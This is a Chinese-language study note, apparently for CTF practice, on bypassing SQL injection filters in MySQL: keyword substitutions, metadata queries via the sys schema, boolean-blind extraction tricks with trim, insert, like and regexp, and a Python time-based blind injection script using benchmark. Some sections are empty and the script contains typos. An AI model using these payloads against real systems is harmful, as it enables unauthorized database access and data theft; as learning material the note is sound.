## 获得过滤词的方法：
1. 通过 burp suit 中的 intruder 模块来爆破我们的对应数据，根据我们的回显长度来判断我们哪些可用，哪些不可用。

2. 通过我们的 python 脚本来进行测试。

## 通用绕过方法：
1. 双写我们的单词

## 通用过滤：
1. 过滤 `or`:
考虑使用 `||` 或者 `|` 来替代, 或者如果过滤的很随便的话，可以考虑使用 oorr 来替代

2. 过滤 `and`:
考虑使用 `&` 或者 `&&` 来替代

3. 过滤 `database`:
我们考虑通过我们的查询一个不存在的表来得到我们的数据库库名，从而避免使用 database 函数

4. 过滤 column:
考虑用 join 去获得我们的对应字段，
```
extractvalue(1,concat(0x7e,(select *from (select *from output a join output b)c)))#
```

5. 过滤空格：
方法一：考虑通过我们的 `/**/` 来绕过
方法二：考虑换一段没有空格的 payload，其中我们的布尔盲注可以做到没有空格
```python

```
6. 过滤我们的等号：
考虑用我们的 `like` 来等价于我们的等号

7. 过滤 `union`:
使用 ununionion

## 无列名盲注：
1. 过滤 in
在过滤了 in 的情况下，也就意味着我们不能继续使用我们的 `information_schema`,这个时候，我们就不能通过我们的 `table` 和 `column` 了。

Mysql 5.7 以后，可以用 sys 系统数据库，了解这个库的元数据信息。

**查询库**
```
select table_schema from sys.schema_table_statisitcs GROUP by table_schema

select table_schema from sys.x$schema_flattened_keys GROUP by table_schema
```

**查询表**：
```sql
select table_name from sys.schema_table_statisitcs where table_schema='数据库名' GROUP BY table_name

select table_name from sys.x$schema_flattened_keys where table_schema='数据库名' GROUP BY table_name
```

2. 过滤 `information,sys`

**查询表**：
```
select table_name from mysql.innodb.table_stats where database_name=database();
```



## 布尔注入过滤词典：

1. 过滤 `union；substr，mid`
```php
<?php

if(isset($_POST["a"])){

    $a=$_POST['a'];

    if(preg_match('/union|;|and|substr|mid|drop|insert/i',$a)){

        die('sb');

    }else{

        echo'flag';

    }

}
```

截取方法：
1. 通过我们的 mid 或者 left+reverse 来截取我们的字符后缀，前缀，而通过 ascill 或者 ord 来获得我们的后缀字符的第一个字母是什么。同时，我们的 ascill 码符号是比较通用的数据。
```python
select * from usere where id='1'a and ascii(mid(字符串,2))>=98
```

2. 使用我们的 trim 从目标字符串中去除我们的目标字符串中的开头的字母，

```sql
select trim(LEADING <i> from 'abcd')=trim(leading<i+1> from 'abcd')
```

我们的输入如下：
1. 如果我们的 i 和 i+1 都不是正确的结果：我们的返回为 true。
2. 如果我们的 i 和 i+1 中有一个是正确的结果：我们的返回为 false。
于是，我们就可以根据我们的回显为 true 还是 false 来判断我们当前的字符是不是我们的 i。

3. insert 字符串：
```sql
select insert('abc',1,2,'xx');
```

上述语句的作用就是把我们的字符串从某个位置开始的一定长度替换为我们的后面的字符串。本质上相当于进行了某一个字符串替换。

于是我们考虑下面的构造方法：假设我们要判断我们的第 $x$ 位是什么，我们第一步就需要把我们的第 $x$ 位之前的数据全部删除，然后，把我们的第 $x+1$ 位及其以后的数据全部删除。

```cpp
select insert((insert('字符串'，1,pos,''),2,99999,''))
```

之后，可以通过修改我们的 pos 来求出我们的对应位置是什么。

比较方法：
1. 等于
2. 大于，小于
3. Like
Like 可以用于判断我们两个数据之间是否存在相同的前缀或者后缀。如果没有使用百分号，like 完全等价于等于号。
```sql
sekect database() like "2019%"
```

4. 正则表达式比较 
```sql
select database() regexp "^ctf"; #不区分大小写
select binary database() rlike "^ctf" #区分大小写的
```

5. between 比较
判断是否在一个范围内：
```sql
select 1 between 1 and 1 #判断是不是完全等于1
```

6. In
判断一个元素是否在一个集合内（区分大小写）：
```sql
select 'a' in ('abc') #同理我们可以让我们的集合完全等于一个
```

7. 异或
主要用于我们在不能消除我们的两个判断符的时候，我们只能采用我们的异或来进行
```sql
select ... where id='1' ^(logic form)^()'1'
```

## 时间盲注过滤：
1. 过滤了 sleep

### Benchmark
我们可以采用其他的耗时很长的函数来进行我们的处理，例如我们的 benchmark 函数，可以测试某些特定操作的执行速度，例如：
```sql
benchmark(1000000,sha1('1234'))
```

我们执行上面的函数也会需要很长时间。

```python
import requests

import time

url="https://ww"

select="select database()"

result=""

for i in range(1,100):

    for j in range(32,128):

        condition=f"ascii(substr(({select}),{i},1))={j}"

        payload=f"123123 and benchmatrk(114514*({condition}),sha1('123123'))%23"

        try:

            r=requests(url=url+payload,timeout=3)

        except:

            result+=chr(j)

            print("[+]",result)

            break

        if j==127:

            print("完成")

            break
```

#### 笛卡尔积：
其中，我们的关键是我们的 `count(*)`,

```sql
SELECt count(*) from information_schema.columns A,information_schema.columns B;
```


#### getlock 方法：


#### 正则表达式：
